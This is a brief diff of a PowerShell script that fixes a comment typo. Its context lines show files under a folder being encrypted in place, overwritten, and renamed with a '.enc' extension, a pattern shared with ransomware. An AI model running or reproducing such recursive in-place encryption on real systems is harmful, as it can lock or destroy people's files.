@@ -73,7 +73,7 @@ Get-ChildItem -Path $SourceFolder -File -Recurse | ForEach-Object {
     [System.IO.File]::WriteAllBytes($File.FullName, $EncryptedContent)
 }
 
-# CHANGE FILE EXTENTIONS
+# CHANGE FILE EXTENSIONS
 # Loop through each file and rename it
 foreach ($file in $files) {
     $newName = $file.Name + ".enc"
